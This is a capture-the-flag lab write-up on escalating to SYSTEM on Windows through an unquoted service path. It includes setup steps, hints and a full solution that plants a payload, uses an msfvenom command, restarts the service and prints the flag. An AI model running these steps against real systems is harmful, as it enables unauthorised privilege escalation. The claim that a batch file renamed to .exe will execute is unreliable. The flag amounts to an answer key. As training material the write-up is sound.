# Challenge 1 — Unquoted Service Path

**Difficulty:** Easy  
**Category:** Windows Privilege Escalation  
**Flag:** hidden at `C:\Windows\System32\config\ctf\flag.txt`

---

## Story

You have a shell as `ctfplayer` — a low-privileged local user — on a Windows machine.
There's a Windows service installed by a developer who wasn't careful about quoting paths.
Windows is about to help you become SYSTEM.

---

## Setup

1. Start a **Windows VM** (Windows 10 or Windows Server 2019/2022)
2. Open PowerShell **as Administrator**
3. Run the setup script:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
.\setup.ps1
```

4. Log out and log back in as `ctfplayer` / `Player123!`

---

## Background: How Unquoted Paths Work

When a Windows service path contains spaces and is **not** quoted, e.g.:

```
C:\Program Files\Vulnerable App\bin\service.exe
```

Windows tries each of these in order before the real path:

```
C:\Program.exe
C:\Program Files\Vulnerable.exe       <-- if you can write here...
C:\Program Files\Vulnerable App\bin\service.exe
```

If you can drop a file at any of those earlier paths, Windows runs *your* file as SYSTEM when the service starts.

---

## Hints

<details>
<summary>Hint 1</summary>
List all services with unquoted paths:

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
```

Or in PowerShell:

```powershell
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -match ' '} | Select Name, PathName
```
</details>

<details>
<summary>Hint 2</summary>
Once you find the vulnerable service path, check which directory along the path you can write to:

```powershell
icacls "C:\Program Files\Vulnerable App"
```
</details>

<details>
<summary>Hint 3</summary>
You need to place an executable at the path Windows will try first.
A minimal payload: a PowerShell one-liner compiled with `msfvenom`, or simply a `.bat` renamed to `.exe` that copies your file somewhere readable.

For CTF purposes — drop a script that reads the flag and writes it to `C:\Users\ctfplayer\Desktop\result.txt`.
</details>

---

## Solution

<details>
<summary>Click to reveal — try on your own first!</summary>

### Step 1 — Find the vulnerable service

```powershell
Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -notmatch '"' -and $_.PathName -match ' '
} | Select Name, PathName
```

You'll see `VulnerableService` with path:
```
C:\Program Files\Vulnerable App\bin\service.exe
```

### Step 2 — Check write permissions

```powershell
icacls "C:\Program Files\Vulnerable App"
```

`ctfplayer` has `(W)` write access on the parent directory.

Windows will try `C:\Program Files\Vulnerable.exe` before the real service binary.

### Step 3 — Create your payload

Create a simple PowerShell script and save it as `Vulnerable.exe` in the right location.
Since this is a CTF, a batch file renamed to .exe works to demonstrate the concept:

```powershell
# Create a payload that copies the flag to a readable location
$payload = @'
@echo off
copy "C:\Windows\System32\config\ctf\flag.txt" "C:\Users\Public\flag.txt"
icacls "C:\Users\Public\flag.txt" /grant Everyone:F
'@
Set-Content -Path "C:\Program Files\Vulnerable App\Vulnerable.exe" -Value $payload
```

In a real engagement you'd use `msfvenom` to generate a proper executable:
```bash
msfvenom -p windows/x64/exec CMD='cmd /c copy C:\Windows\System32\config\ctf\flag.txt C:\Users\Public\flag.txt' -f exe -o Vulnerable.exe
```

### Step 4 — Restart the service (or wait for reboot)

If you can restart the service:
```powershell
Restart-Service VulnerableService
```

If not, trigger a reboot (in a real pentest you'd wait for next reboot).

### Step 5 — Read the flag

```powershell
type C:\Users\Public\flag.txt
```

```
CTF{unqu0t3d_p4th_pr1v3sc}
```

### Why this works

Windows parses unquoted paths by tokenizing at each space. It checks each possible interpretation as an executable. If a lower-privileged user can write to any parent directory in that path, they can plant a malicious binary that runs as SYSTEM when the service starts. Always quote service binary paths.

</details>
